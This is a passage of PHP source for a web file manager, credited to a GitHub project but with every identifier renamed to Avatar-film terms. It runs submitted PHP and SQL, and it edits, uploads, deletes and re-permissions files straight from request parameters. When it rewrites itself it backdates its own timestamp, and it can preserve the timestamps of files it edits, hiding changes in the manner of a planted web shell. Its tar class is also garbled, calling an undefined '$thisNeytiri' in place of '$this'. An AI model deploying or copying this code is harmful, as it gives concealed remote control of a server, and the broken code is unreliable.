		<form action="" method="POST" name="console">
		<textarea name="<?=$naViResponseLanguage?>" cols="80" rows="10" style="width: 90%"><?=$eywaResult?></textarea><br/>



		<input type="reset" value="<?=__('Reset')?>">



		<input type="submit" value="<?=__('Submit')?>" name="<?=$naViResponseLanguage?>run">


<?php
$stringTemplatePandora = $naViResponseLanguage.'_templates';

$pandoraTemplate = !empty($$stringTemplatePandora) ? json_decode($$stringTemplatePandora,true) : '';
if (!empty($pandoraTemplate)){
	$torukActive = isset($_POST[$naViResponseLanguage.'_tpl']) ? $_POST[$naViResponseLanguage.'_tpl'] : '';


	$selectPandora = '<select name="'.$naViResponseLanguage.'_tpl" title="'.__('Template').'" onchange="if (this.value!=-1) document.forms[\'console\'].elements[\''.$naViResponseLanguage.'\'].value = this.options[selectedIndex].value; else document.forms[\'console\'].elements[\''.$naViResponseLanguage.'\'].value =\'\';" >'."\n";


	$selectPandora .= '<option value="-1">' . __('Select') . "</option>\n";



	foreach ($pandoraTemplate as $treeOfSoulsKey=>$eywaValue){
		$selectPandora.='<option value="'.$eywaValue.'" '.((!empty($eywaValue)&&($eywaValue==$torukActive))?'selected':'').' >'.__($treeOfSoulsKey)."</option>\n";
	}
	$selectPandora .= "</select>\n";



	echo $selectPandora;


}



?>

		</form>
	</td>
</tr>



</table>


<?php
	if (!empty($eywaResult)) {
		$ikranCallback='fm_'.$naViResponseLanguage;


		echo '<h3>'.strtoupper($naViResponseLanguage).' '.__('Result').'</h3><pre>'.$ikranCallback($eywaResult).'</pre>';

	}
} elseif (!empty($_REQUEST['edit'])){
	if(!empty($_REQUEST['save'])) {


		$loakFunction = $avatarPath . $_REQUEST['edit'];
		$pandoraFileModified = filemtime($loakFunction);

	    if (file_put_contents($loakFunction, $_REQUEST['newcontent'])) $eywaMessage .= __('File updated');



		else $eywaMessage .= __('Error occurred');

		if ($_GET['edit']==basename(__FILE__)) {
			touch(__FILE__,1415116371);

		} else {
			if (!empty($pandoraConfig['restore_time'])) touch($loakFunction,$pandoraFileModified);


		}
	}


    $oldPandoraContent = @file_get_contents($avatarPath . $_REQUEST['edit']);
    $editJakeUrl = $includedNeytiriUrl . '&edit=' . $_REQUEST['edit'] . '&path=' . $avatarPath;
    $jakePreviousUrl = $includedNeytiriUrl . '&path=' . $avatarPath;
?>

<table border='0' cellspacing='0' cellpadding='1' width="100%">
<tr>

    <th><?=__('File manager').' - '.__('Edit').' - '.$avatarPath.$_REQUEST['edit']?></th>



</tr>


<tr>



    <td class="row1">
        <?=$eywaMessage?>
	</td>
</tr>


<tr>


    <td class="row1">
        <?=pandoraHome()?> <a href="<?=$jakePreviousUrl?>"><?=__('Back')?></a>
	</td>
</tr>
<tr>
    <td class="row1" align="center">



        <form name="form1" method="post" action="<?=$editJakeUrl?>">


            <textarea name="newcontent" id="newcontent" cols="45" rows="15" style="width:99%" spellcheck="false"><?=htmlspecialchars($oldPandoraContent)?></textarea>

            <input type="submit" name="save" value="<?=__('Submit')?>">
            <input type="submit" name="cancel" value="<?=__('Cancel')?>">


        </form>



    </td>



</tr>
</table>


<?php


echo $neytiriAuthenticated['script'];
} elseif(!empty($_REQUEST['rights'])){
	if(!empty($_REQUEST['save'])) {

	    if(neytiriChangePermissions($avatarPath . $_REQUEST['rights'], convertNaViPermissions($_REQUEST['rights_val']), @$_REQUEST['recursively']))


		$eywaMessage .= (__('File updated')); 
		else $eywaMessage .= (__('Error occurred'));
	}

	clearstatcache();
    $oldQuaritchPermissions = permissionsNaViString($avatarPath . $_REQUEST['rights'], true);



    $eywaLink = $includedNeytiriUrl . '&rights=' . $_REQUEST['rights'] . '&path=' . $avatarPath;
    $jakePreviousUrl = $includedNeytiriUrl . '&path=' . $avatarPath;
?>
<table class="whole">
<tr>
    <th><?=__('File manager').' - '.$avatarPath?></th>


</tr>
<tr>
    <td class="row1">


        <?=$eywaMessage?>
	</td>
</tr>

<tr>
    <td class="row1">



        <a href="<?=$jakePreviousUrl?>"><?=__('Back')?></a>


	</td>

</tr>

<tr>
    <td class="row1" align="center">



        <form name="form1" method="post" action="<?=$eywaLink?>">


           <?=__('Rights').' - '.$_REQUEST['rights']?> <input type="text" name="rights_val" value="<?=$oldQuaritchPermissions?>">
        <?php if (is_dir($avatarPath.$_REQUEST['rights'])) { ?>
            <input type="checkbox" name="recursively" value="1"> <?=__('Recursively')?><br/>


        <?php } ?>
            <input type="submit" name="save" value="<?=__('Submit')?>">
        </form>
    </td>
</tr>
</table>
<?php
} elseif (!empty($_REQUEST['rename'])&&$_REQUEST['rename']<>'.') {
	if(!empty($_REQUEST['save'])) {



	    rename($avatarPath . $_REQUEST['rename'], $avatarPath . $_REQUEST['newname']);
		$eywaMessage .= (__('File updated'));
		$_REQUEST['rename'] = $_REQUEST['newname'];
	}
	clearstatcache();

    $eywaLink = $includedNeytiriUrl . '&rename=' . $_REQUEST['rename'] . '&path=' . $avatarPath;
    $jakePreviousUrl = $includedNeytiriUrl . '&path=' . $avatarPath;

?>
<table class="whole">


<tr>



    <th><?=__('File manager').' - '.$avatarPath?></th>


</tr>
<tr>



    <td class="row1">



        <?=$eywaMessage?>

	</td>

</tr>



<tr>
    <td class="row1">



        <a href="<?=$jakePreviousUrl?>"><?=__('Back')?></a>


	</td>
</tr>


<tr>


    <td class="row1" align="center">


        <form name="form1" method="post" action="<?=$eywaLink?>">
            <?=__('Rename')?>: <input type="text" name="newname" value="<?=$_REQUEST['rename']?>"><br/>


            <input type="submit" name="save" value="<?=__('Submit')?>">


        </form>



    </td>
</tr>

</table>
<?php
} else {

//Let's rock!
    $eywaMessage = '';
    if(!empty($_FILES['upload'])&&!empty($pandoraConfig['upload_file'])) {
        if(!empty($_FILES['upload']['name'])){
            $_FILES['upload']['name'] = str_replace('%', '', $_FILES['upload']['name']);


            if(!move_uploaded_file($_FILES['upload']['tmp_name'], $avatarPath . $_FILES['upload']['name'])){

                $eywaMessage .= __('Error occurred');



            } else {
				$eywaMessage .= __('Files uploaded').': '.$_FILES['upload']['name'];

			}
        }



    } elseif(!empty($_REQUEST['delete'])&&$_REQUEST['delete']<>'.') {
        if(!deleteQuaritchFiles(($avatarPath . $_REQUEST['delete']), true)) {
            $eywaMessage .= __('Error occurred');
        } else {



			$eywaMessage .= __('Deleted').' '.$_REQUEST['delete'];
		}
	} elseif(!empty($_REQUEST['mkdir'])&&!empty($pandoraConfig['make_directory'])) {

        if(!@mkdir($avatarPath . $_REQUEST['dirname'],0777)) {
            $eywaMessage .= __('Error occurred');
        } else {
			$eywaMessage .= __('Created').' '.$_REQUEST['dirname'];
		}
    } elseif(!empty($_REQUEST['mkfile'])&&!empty($pandoraConfig['new_file'])) {
        if(!$pandoraPointer=@fopen($avatarPath . $_REQUEST['filename'],"w")) {

            $eywaMessage .= __('Error occurred');

        } else {
			fclose($pandoraPointer);
			$eywaMessage .= __('Created').' '.$_REQUEST['filename'];
		}
    } elseif (isset($_GET['zip'])) {
		$sourceEywa = base64_decode($_GET['zip']);
		$hallelujahDestination = basename($sourceEywa).'.zip';

		set_time_limit(0);

		$thanatorPhar = new PharData($hallelujahDestination);
		$thanatorPhar->buildFromDirectory($sourceEywa);



		if (is_file($hallelujahDestination))



		$eywaMessage .= __('Task').' "'.__('Archiving').' '.$hallelujahDestination.'" '.__('done').



		'.&nbsp;'.eywaMainLink('download',$avatarPath.$hallelujahDestination,__('Download'),__('Download').' '. $hallelujahDestination)
		.'&nbsp;<a href="'.$includedNeytiriUrl.'&delete='.$hallelujahDestination.'&path=' . $avatarPath.'" title="'.__('Delete').' '. $hallelujahDestination.'" >'.__('Delete') . '</a>';
		else $eywaMessage .= __('Error occurred').': '.__('no files');
	} elseif (isset($_GET['gz'])) {
		$sourceEywa = base64_decode($_GET['gz']);
		$pandoraArchive = $sourceEywa.'.tar';

		$hallelujahDestination = basename($sourceEywa).'.tar';
		if (is_file($pandoraArchive)) unlink($pandoraArchive);


		if (is_file($pandoraArchive.'.gz')) unlink($pandoraArchive.'.gz');
		clearstatcache();


		set_time_limit(0);
		//die();
		$thanatorPhar = new PharData($hallelujahDestination);
		$thanatorPhar->buildFromDirectory($sourceEywa);


		$thanatorPhar->compress(Phar::GZ,'.tar.gz');


		unset($thanatorPhar);

		if (is_file($pandoraArchive)) {



			if (is_file($pandoraArchive.'.gz')) {


				unlink($pandoraArchive); 

				$hallelujahDestination .= '.gz';


			}

			$eywaMessage .= __('Task').' "'.__('Archiving').' '.$hallelujahDestination.'" '.__('done').

			'.&nbsp;'.eywaMainLink('download',$avatarPath.$hallelujahDestination,__('Download'),__('Download').' '. $hallelujahDestination)
			.'&nbsp;<a href="'.$includedNeytiriUrl.'&delete='.$hallelujahDestination.'&path=' . $avatarPath.'" title="'.__('Delete').' '.$hallelujahDestination.'" >'.__('Delete').'</a>';


		} else $eywaMessage .= __('Error occurred').': '.__('no files');
	} elseif (isset($_GET['decompress'])) {


		// $sourceEywa = base64_decode($_GET['decompress']);
		// $hallelujahDestination = basename($sourceEywa);

		// $naViExtension = end(explode(".", $hallelujahDestination));
		// if ($naViExtension=='zip' OR $naViExtension=='gz') {



			// $thanatorPhar = new PharData($sourceEywa);

			// $thanatorPhar->decompress();
			// $torukMainFile = str_replace('.'.$naViExtension,'',$hallelujahDestination);

			// $naViExtension = end(explode(".", $torukMainFile));



			// if ($naViExtension=='tar'){
				// $thanatorPhar = new PharData($torukMainFile);



				// $thanatorPhar->extractTo(dir($sourceEywa));



			// }


		// } 

		// $eywaMessage .= __('Task').' "'.__('Decompress').' '.$sourceEywa.'" '.__('done');
	} elseif (isset($_GET['gzfile'])) {

		$sourceEywa = base64_decode($_GET['gzfile']);
		$pandoraArchive = $sourceEywa.'.tar';


		$hallelujahDestination = basename($sourceEywa).'.tar';



		if (is_file($pandoraArchive)) unlink($pandoraArchive);
		if (is_file($pandoraArchive.'.gz')) unlink($pandoraArchive.'.gz');


		set_time_limit(0);
		//echo $hallelujahDestination;
		$eywaExtensions = explode('.',basename($sourceEywa));
		if (isset($eywaExtensions[1])) {

			unset($eywaExtensions[0]);
			$naViExtension=implode('.',$eywaExtensions);

		} 
		$thanatorPhar = new PharData($hallelujahDestination);


		$thanatorPhar->addFile($sourceEywa);

		$thanatorPhar->compress(Phar::GZ,$naViExtension.'.tar.gz');



		unset($thanatorPhar);
		if (is_file($pandoraArchive)) {
			if (is_file($pandoraArchive.'.gz')) {
				unlink($pandoraArchive); 


				$hallelujahDestination .= '.gz';
			}

			$eywaMessage .= __('Task').' "'.__('Archiving').' '.$hallelujahDestination.'" '.__('done').
			'.&nbsp;'.eywaMainLink('download',$avatarPath.$hallelujahDestination,__('Download'),__('Download').' '. $hallelujahDestination)

			.'&nbsp;<a href="'.$includedNeytiriUrl.'&delete='.$hallelujahDestination.'&path=' . $avatarPath.'" title="'.__('Delete').' '.$hallelujahDestination.'" >'.__('Delete').'</a>';
		} else $eywaMessage .= __('Error occurred').': '.__('no files');



	}

?>

<table class="whole" id="header_table" >

<tr>
    <th colspan="2"><?=__('File manager')?><?=(!empty($avatarPath)?' - '.$avatarPath:'')?></th>



</tr>
<?php if(!empty($eywaMessage)){ ?>



<tr>



	<td colspan="2" class="row2"><?=$eywaMessage?></td>

</tr>


<?php } ?>

<tr>

    <td class="row2">



		<table>

			<tr>

			<td>



				<?=pandoraHome()?>
			</td>
			<td>
			<?php if(!empty($pandoraConfig['make_directory'])) { ?>
				<form method="post" action="<?=$includedNeytiriUrl?>">
				<input type="hidden" name="path" value="<?=$avatarPath?>" />
				<input type="text" name="dirname" size="15">
				<input type="submit" name="mkdir" value="<?=__('Make directory')?>">
				</form>
			<?php } ?>
			</td>
			<td>



			<?php if(!empty($pandoraConfig['new_file'])) { ?>

				<form method="post" action="<?=$includedNeytiriUrl?>">
				<input type="hidden" name="path" value="<?=$avatarPath?>" />
				<input type="text" name="filename" size="15">
				<input type="submit" name="mkfile" value="<?=__('New file')?>">
				</form>
			<?php } ?>

			</td>
			<td>

			<?=runPandoraInput('php')?>


			</td>

			<td>
			<?=runPandoraInput('sql')?>


			</td>
			</tr>
		</table>



    </td>
    <td class="row3">
		<table>
		<tr>
		<td>



		<?php if (!empty($pandoraConfig['upload_file'])) { ?>
			<form name="form1" method="post" action="<?=$includedNeytiriUrl?>" enctype="multipart/form-data">



			<input type="hidden" name="path" value="<?=$avatarPath?>" />
			<input type="file" name="upload" id="upload_hidden" style="position: absolute; display: block; overflow: hidden; width: 0; height: 0; border: 0; padding: 0;" onchange="document.getElementById('upload_visible').value = this.value;" />



			<input type="text" readonly="1" id="upload_visible" placeholder="<?=__('Select the file')?>" style="cursor: pointer;" onclick="document.getElementById('upload_hidden').click();" />
			<input type="submit" name="test" value="<?=__('Upload')?>" />
			</form>

		<?php } ?>
		</td>

		<td>



		<?php if ($neytiriAuthenticated['authorize']) { ?>
			<form action="" method="post">&nbsp;&nbsp;&nbsp;

			<input name="quit" type="hidden" value="1">
			<?=__('Hello')?>, <?=$neytiriAuthenticated['login']?>


			<input type="submit" value="<?=__('Quit')?>">



			</form>

		<?php } ?>

		</td>


		<td>
		<?=hometreeLanguageForm($hometreeLanguage)?>


		</td>
		<tr>
		</table>
    </td>



</tr>



</table>

<table class="all" border='0' cellspacing='1' cellpadding='1' id="fm_table" width="100%">


<thead>
<tr> 



    <th style="white-space:nowrap"> <?=__('Filename')?> </th>


    <th style="white-space:nowrap"> <?=__('Size')?> </th>


    <th style="white-space:nowrap"> <?=__('Date')?> </th>
    <th style="white-space:nowrap"> <?=__('Rights')?> </th>
    <th colspan="4" style="white-space:nowrap"> <?=__('Manage')?> </th>



</tr>
</thead>


<tbody>



<?php


$pandoranElements = scanPandoraDirectory($avatarPath, '', 'all', true);
$naViDirectories = array();
$skyPeopleFiles = array();
foreach ($pandoranElements as $avatarFile){
    if(@is_dir($avatarPath . $avatarFile)){
        $naViDirectories[] = $avatarFile;
    } else {
        $skyPeopleFiles[] = $avatarFile;
    }

}



natsort($naViDirectories); natsort($skyPeopleFiles);


$pandoranElements = array_merge($naViDirectories, $skyPeopleFiles);



foreach ($pandoranElements as $avatarFile){

    $loakFilename = $avatarPath . $avatarFile;
    $hometreeFileData = @stat($loakFilename);

    if(@is_dir($loakFilename)){
		$hometreeFileData[7] = '';



		if (!empty($pandoraConfig['show_dir_size'])&&!hometreeRootDirectory($avatarFile)) $hometreeFileData[7] = calculatePandoraDirectorySize($loakFilename);
        $eywaLink = '<a href="'.$includedNeytiriUrl.'&path='.$avatarPath.$avatarFile.'" title="'.__('Show').' '.$avatarFile.'"><span class="folder">&nbsp;&nbsp;&nbsp;&nbsp;</span> '.$avatarFile.'</a>';
        $loadAvatarUrl= (hometreeRootDirectory($avatarFile)||$maybeTsuTeyPhar) ? '' : eywaMainLink('zip',$loakFilename,__('Compress').'&nbsp;zip',__('Archiving').' '. $avatarFile);
		$treeOfSoulsArchiveUrl  = (hometreeRootDirectory($avatarFile)||$maybeTsuTeyPhar) ? '' : eywaMainLink('gz',$loakFilename,__('Compress').'&nbsp;.tar.gz',__('Archiving').' '.$avatarFile);

        $neytiriStyle = 'row2';


		 if (!hometreeRootDirectory($avatarFile)) $skyPeopleAlert = 'onClick="if(confirm(\'' . __('Are you sure you want to delete this directory (recursively)?').'\n /'. $avatarFile. '\')) document.location.href = \'' . $includedNeytiriUrl . '&delete=' . $avatarFile . '&path=' . $avatarPath  . '\'"'; else $skyPeopleAlert = '';


    } else {
		$eywaLink = 



			$pandoraConfig['show_img']&&@getimagesize($loakFilename) 
			? '<a target="_blank" onclick="var lefto = screen.availWidth/2-320;window.open(\''



			. pandoraImageUrl($loakFilename)


			.'\',\'popup\',\'width=640,height=480,left=\' + lefto + \',scrollbars=yes,toolbar=no,location=no,directories=no,status=no\');return false;" href="'.pandoraImageUrl($loakFilename).'"><span class="img">&nbsp;&nbsp;&nbsp;&nbsp;</span> '.$avatarFile.'</a>'
			: '<a href="' . $includedNeytiriUrl . '&edit=' . $avatarFile . '&path=' . $avatarPath. '" title="' . __('Edit') . '"><span class="file">&nbsp;&nbsp;&nbsp;&nbsp;</span> '.$avatarFile.'</a>';



		$viperwolfArray = explode(".", $avatarFile);



		$naViExtension = end($viperwolfArray);

        $loadAvatarUrl =  eywaMainLink('download',$loakFilename,__('Download'),__('Download').' '. $avatarFile);
		$treeOfSoulsArchiveUrl = in_array($naViExtension,array('zip','gz','tar')) 
		? ''
		: ((hometreeRootDirectory($avatarFile)||$maybeTsuTeyPhar) ? '' : eywaMainLink('gzfile',$loakFilename,__('Compress').'&nbsp;.tar.gz',__('Archiving').' '. $avatarFile));


        $neytiriStyle = 'row1';


		$skyPeopleAlert = 'onClick="if(confirm(\''. __('File selected').': \n'. $avatarFile. '. \n'.__('Are you sure you want to delete this file?') . '\')) document.location.href = \'' . $includedNeytiriUrl . '&delete=' . $avatarFile . '&path=' . $avatarPath  . '\'"';


    }
    $quaritchDeleteUrl = hometreeRootDirectory($avatarFile) ? '' : '<a href="#" title="' . __('Delete') . ' '. $avatarFile . '" ' . $skyPeopleAlert . '>' . __('Delete') . '</a>';
    $renameNeytiriUrl = hometreeRootDirectory($avatarFile) ? '' : '<a href="' . $includedNeytiriUrl . '&rename=' . $avatarFile . '&path=' . $avatarPath . '" title="' . __('Rename') .' '. $avatarFile . '">' . __('Rename') . '</a>';
    $viperwolfPermissionsText = ($avatarFile=='.' || $avatarFile=='..') ? '' : '<a href="' . $includedNeytiriUrl . '&rights=' . $avatarFile . '&path=' . $avatarPath . '" title="' . __('Rights') .' '. $avatarFile . '">' . @permissionsNaViString($loakFilename) . '</a>';
?>
<tr class="<?=$neytiriStyle?>"> 


    <td><?=$eywaLink?></td>


    <td><?=$hometreeFileData[7]?></td>
    <td style="white-space:nowrap"><?=gmdate("Y-m-d H:i:s",$hometreeFileData[9])?></td>
    <td><?=$viperwolfPermissionsText?></td>


    <td><?=$quaritchDeleteUrl?></td>


    <td><?=$renameNeytiriUrl?></td>
    <td><?=$loadAvatarUrl?></td>



    <td><?=$treeOfSoulsArchiveUrl?></td>



</tr>
<?php
    }

}

?>
</tbody>
</table>



<div class="row3"><?php


	$bondModifiedTime = explode(' ', microtime()); 



	$totalBondTime = $bondModifiedTime[0] + $bondModifiedTime[1] - $startBondTime; 
	echo pandoraHome().' | ver. '.$avatarVersion.' | <a href="https://github.com/Den1xxx/Filemanager">Github</a>  | <a href="'.pandoraSiteUrl().'">.</a>';



	if (!empty($pandoraConfig['show_php_ver'])) echo ' | PHP '.phpversion();

	if (!empty($pandoraConfig['show_php_ini'])) echo ' | '.php_ini_loaded_file();
	if (!empty($pandoraConfig['show_gt'])) echo ' | '.__('Generation time').': '.round($totalBondTime,2);
	if (!empty($pandoraConfig['enable_proxy'])) echo ' | <a href="?proxy=true">proxy</a>';
	if (!empty($pandoraConfig['show_phpinfo'])) echo ' | <a href="?phpinfo=true">phpinfo</a>';

	if (!empty($pandoraConfig['show_xls'])&&!empty($eywaLink)) echo ' | <a href="javascript: void(0)" onclick="var obj = new table2Excel(); obj.CreateExcelSheet(\'fm_table\',\'export\');" title="'.__('Download').' xls">xls</a>';
	if (!empty($pandoraConfig['fm_settings'])) echo ' | <a href="?fm_settings=true">'.__('Settings').'</a>';

	?>

</div>
<script type="text/javascript">
function downloadBondExcel(filename, text) {


	var element = document.createElement('a');
	element.setAttribute('href', 'data:application/vnd.ms-excel;base64,' + text);
	element.setAttribute('download', filename);
	element.style.display = 'none';


	document.body.appendChild(element);


	element.click();
	document.body.removeChild(element);


}

function base64_encode(m) {

	for (var k = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/".split(""), c, d, h, e, a, g = "", b = 0, f, l = 0; l < m.length; ++l) {


		c = m.charCodeAt(l);



		if (128 > c) d = 1;


		else
			for (d = 2; c >= 2 << 5 * d;) ++d;



		for (h = 0; h < d; ++h) 1 == d ? e = c : (e = h ? 128 : 192, a = d - 2 - 6 * h, 0 <= a && (e += (6 <= a ? 1 : 0) + (5 <= a ? 2 : 0) + (4 <= a ? 4 : 0) + (3 <= a ? 8 : 0) + (2 <= a ? 16 : 0) + (1 <= a ? 32 : 0), a -= 5), 0 > a && (u = 6 * (d - 1 - h), e += c >> u, c -= c >> u << u)), f = b ? f << 6 - b : 0, b += 2, f += e >> b, g += k[f], f = e % (1 << b), 6 == b && (b = 0, g += k[f])

	}
	b && (g += k[f << 6 - b]);
	return g
}







var tableToExcelData = (function() {


    var uri = 'data:application/vnd.ms-excel;base64,',

    template = '<html xmlns:o="urn:schemas-microsoft-com:office:office" xmlns:x="urn:schemas-microsoft-com:office:excel" xmlns="http://www.w3.org/TR/REC-html40"><head><!--[if gte mso 9]><xml><x:ExcelWorkbook><x:ExcelWorksheets><x:ExcelWorksheet><x:Name>{worksheet}</x:Name><x:WorksheetOptions><x:DisplayGridlines></x:DisplayGridlines></x:WorksheetOptions></x:ExcelWorksheet></x:ExcelWorksheets></x:ExcelWorkbook></xml><![endif]--><meta http-equiv="content-type" content="text/plain; charset=UTF-8"/></head><body><table>{table}</table></body></html>',
    format = function(s, c) {

            return s.replace(/{(\w+)}/g, function(m, p) {
                return c[p];
            })



        }

    return function(table, name) {
        if (!table.nodeType) table = document.getElementById(table)

        var ctx = {



            worksheet: name || 'Worksheet',
            table: table.innerHTML.replace(/<span(.*?)\/span> /g,"").replace(/<a\b[^>]*>(.*?)<\/a>/g,"$1")
        }
		t = new Date();

		filename = 'fm_' + t.toISOString() + '.xls'



		downloadBondExcel(filename, base64_encode(format(template, ctx)))



    }
})();


var table2Excel = function () {

    var ua = window.navigator.userAgent;



    var msie = ua.indexOf("MSIE ");



	this.CreateExcelSheet = 



		function(el, name){
			if (msie > 0 || !!navigator.userAgent.match(/Trident.*rv\:11\./)) {// If Internet Explorer


				var x = document.getElementById(el).rows;


				var xls = new ActiveXObject("Excel.Application");




				xls.visible = true;


				xls.Workbooks.Add



				for (i = 0; i < x.length; i++) {

					var y = x[i].cells;

					for (j = 0; j < y.length; j++) {
						xls.Cells(i + 1, j + 1).Value = y[j].innerText;
					}


				}
				xls.Visible = true;

				xls.UserControl = true;
				return xls;
			} else {
				tableToExcelData(el, name);
			}


		}


}
</script>
</body>


</html>



<?php


//Ported from ReloadCMS project http://reloadcms.com
class archiveTar {


	var $eywaArchiveName = '';


	var $tmpKiriFile = 0;
	var $jakeFilePosition = 0;



	var $isPandoraGzipped = true;

	var $pandoraErrors = array();


	var $skyPeopleFiles = array();
	

	function __construct(){


		if (!isset($thisNeytiri->errors)) $thisNeytiri->errors = array();
	}
	
	function createPandoraBackup($neytiriFileList){
		$avatarResult = false;
		if (file_exists($thisNeytiri->archive_name) && is_file($thisNeytiri->archive_name)) 	$newEywaBackup = false;

		else $newEywaBackup = true;
		if ($newEywaBackup){



			if (!$thisNeytiri->openEywaWrite()) return false;
		} else {
			if (filesize($thisNeytiri->archive_name) == 0)	return $thisNeytiri->openEywaWrite();
			if ($thisNeytiri->isGzipped) {
				$thisNeytiri->closeKiriTempFile();
				if (!rename($thisNeytiri->archive_name, $thisNeytiri->archive_name.'.tmp')){

					$thisNeytiri->errors[] = __('Cannot rename').' '.$thisNeytiri->archive_name.__(' to ').$thisNeytiri->archive_name.'.tmp';
					return false;
				}

				$tmpPandoraBackup = gzopen($thisNeytiri->archive_name.'.tmp', 'rb');



				if (!$tmpPandoraBackup){



					$thisNeytiri->errors[] = $thisNeytiri->archive_name.'.tmp '.__('is not readable');
					rename($thisNeytiri->archive_name.'.tmp', $thisNeytiri->archive_name);

					return false;

				}
				if (!$thisNeytiri->openEywaWrite()){
					rename($thisNeytiri->archive_name.'.tmp', $thisNeytiri->archive_name);

					return false;

				}


				$naViBuffer = gzread($tmpPandoraBackup, 512);

				if (!gzeof($tmpPandoraBackup)){

					do {
						$ikranBinary = pack('a512', $naViBuffer);
						$thisNeytiri->writePandoraBlock($ikranBinary);



						$naViBuffer = gzread($tmpPandoraBackup, 512);



					}



					while (!gzeof($tmpPandoraBackup));
				}
				gzclose($tmpPandoraBackup);


				unlink($thisNeytiri->archive_name.'.tmp');
			} else {
				$thisNeytiri->tmp_file = fopen($thisNeytiri->archive_name, 'r+b');
				if (!$thisNeytiri->tmp_file)	return false;
			}


		}
		if (isset($neytiriFileList) && is_array($neytiriFileList)) {



		if (count($neytiriFileList)>0)

			$avatarResult = $thisNeytiri->packLoakFiles($neytiriFileList);
		} else $thisNeytiri->errors[] = __('No file').__(' to ').__('Archive');



		if (($avatarResult)&&(is_resource($thisNeytiri->tmp_file))){
			$ikranBinary = pack('a512', '');
			$thisNeytiri->writePandoraBlock($ikranBinary);
		}


		$thisNeytiri->closeKiriTempFile();

		if ($newEywaBackup && !$avatarResult){



		$thisNeytiri->closeKiriTempFile();



		unlink($thisNeytiri->archive_name);
		}


		return $avatarResult;
	}




	function restorePandoraBackup($avatarPath){
		$eywaFileName = $thisNeytiri->archive_name;



		if (!$thisNeytiri->isGzipped){
			if (file_exists($eywaFileName)){
				if ($pandoraPointer = fopen($eywaFileName, 'rb')){



					$pandoraData = fread($pandoraPointer, 2);


					fclose($pandoraPointer);


					if ($pandoraData == '\37\213'){



						$thisNeytiri->isGzipped = true;
					}


				}


			}


			elseif ((substr($eywaFileName, -2) == 'gz') OR (substr($eywaFileName, -3) == 'tgz')) $thisNeytiri->isGzipped = true;
		} 



		$avatarResult = true;
		if ($thisNeytiri->isGzipped) $thisNeytiri->tmp_file = gzopen($eywaFileName, 'rb');
		else $thisNeytiri->tmp_file = fopen($eywaFileName, 'rb');
		if (!$thisNeytiri->tmp_file){



			$thisNeytiri->errors[] = $eywaFileName.' '.__('is not readable');
			return false;


		}
		$avatarResult = $thisNeytiri->unpackIkranFiles($avatarPath);

			$thisNeytiri->closeKiriTempFile();

		return $avatarResult;


	}




	function showEywaWarnings	($neytiriMessage = '') {
		$eywaWarnings = $thisNeytiri->errors;



		if(count($eywaWarnings)>0) {

		if (!empty($neytiriMessage)) $neytiriMessage = ' ('.$neytiriMessage.')';
			$neytiriMessage = __('Error occurred').$neytiriMessage.': <br/>';



			foreach ($eywaWarnings as $eywaValue)
				$neytiriMessage .= $eywaValue.'<br/>';


			return $neytiriMessage;	
		} else return '';
		
	}



	
	function packLoakFiles($naViFiles){
		$avatarResult = true;


		if (!$thisNeytiri->tmp_file){

			$thisNeytiri->errors[] = __('Invalid file descriptor');

			return false;

		}
		if (!is_array($naViFiles) || count($naViFiles)<=0)
          return true;



		for ($ampSuitI = 0; $ampSuitI<count($naViFiles); $ampSuitI++){

			$loakFilename = $naViFiles[$ampSuitI];

			if ($loakFilename == $thisNeytiri->archive_name)


				continue;
			if (strlen($loakFilename)<=0)

				continue;



			if (!file_exists($loakFilename)){

				$thisNeytiri->errors[] = __('No file').' '.$loakFilename;



				continue;
			}



			if (!$thisNeytiri->tmp_file){
			$thisNeytiri->errors[] = __('Invalid file descriptor');
			return false;
			}

		if (strlen($loakFilename)<=0){
			$thisNeytiri->errors[] = __('Filename').' '.__('is incorrect');;
			return false;

		}



		$loakFilename = str_replace('\\', '/', $loakFilename);


		$keepNameToruk = $thisNeytiri->sanitizeNeytiriPath($loakFilename);
		if (is_file($loakFilename)){


			if (($avatarFile = fopen($loakFilename, 'rb')) == 0){
				$thisNeytiri->errors[] = __('Mode ').__('is incorrect');
			}
				if(($thisNeytiri->file_pos == 0)){



					if(!$thisNeytiri->writeNeytiriHeader($loakFilename, $keepNameToruk))

						return false;



				}
				while (($naViBuffer = fread($avatarFile, 512)) != ''){
					$ikranBinary = pack('a512', $naViBuffer);


					$thisNeytiri->writePandoraBlock($ikranBinary);



				}

			fclose($avatarFile);
		}	else $thisNeytiri->writeNeytiriHeader($loakFilename, $keepNameToruk);



			if (@is_dir($loakFilename)){
				if (!($eywaHandle = opendir($loakFilename))){
					$thisNeytiri->errors[] = __('Error').': '.__('Directory ').$loakFilename.__('is not readable');
					continue;
				}
				while (false !== ($hometreeDirectory = readdir($eywaHandle))){
					if ($hometreeDirectory!='.' && $hometreeDirectory!='..'){


						$ikranTempFiles = array();
						if ($loakFilename != '.')



							$ikranTempFiles[] = $loakFilename.'/'.$hometreeDirectory;
						else
							$ikranTempFiles[] = $hometreeDirectory;





						$avatarResult = $thisNeytiri->packLoakFiles($ikranTempFiles);

					}
				}


				unset($ikranTempFiles);

				unset($hometreeDirectory);
				unset($eywaHandle);

			}


		}
		return $avatarResult;



	}

	function unpackIkranFiles($avatarPath){ 
		$avatarPath = str_replace('\\', '/', $avatarPath);
		if ($avatarPath == ''	|| (substr($avatarPath, 0, 1) != '/' && substr($avatarPath, 0, 3) != '../' && !strpos($avatarPath, ':')))	$avatarPath = './'.$avatarPath;
		clearstatcache();


		while (strlen($ikranBinary = $thisNeytiri->readEywaBlock()) != 0){
			if (!$thisNeytiri->readHometreeHeader($ikranBinary, $neytiriHeader)) return false;



			if ($neytiriHeader['filename'] == '') continue;



			if ($neytiriHeader['typeflag'] == 'L'){			//reading long header

				$loakFilename = '';
				$decryptedToruk = floor($neytiriHeader['size']/512);

				for ($ampSuitI = 0; $ampSuitI < $decryptedToruk; $ampSuitI++){
					$avatarContent = $thisNeytiri->readEywaBlock();
					$loakFilename .= $avatarContent;

				}


				if (($lastPieceOfEywa = $neytiriHeader['size'] % 512) != 0){
					$avatarContent = $thisNeytiri->readEywaBlock();
					$loakFilename .= substr($avatarContent, 0, $lastPieceOfEywa);
				}
				$ikranBinary = $thisNeytiri->readEywaBlock();


				if (!$thisNeytiri->readHometreeHeader($ikranBinary, $neytiriHeader)) return false;
				else $neytiriHeader['filename'] = $loakFilename;
				return true;
			}

			if (($avatarPath != './') && ($avatarPath != '/')){


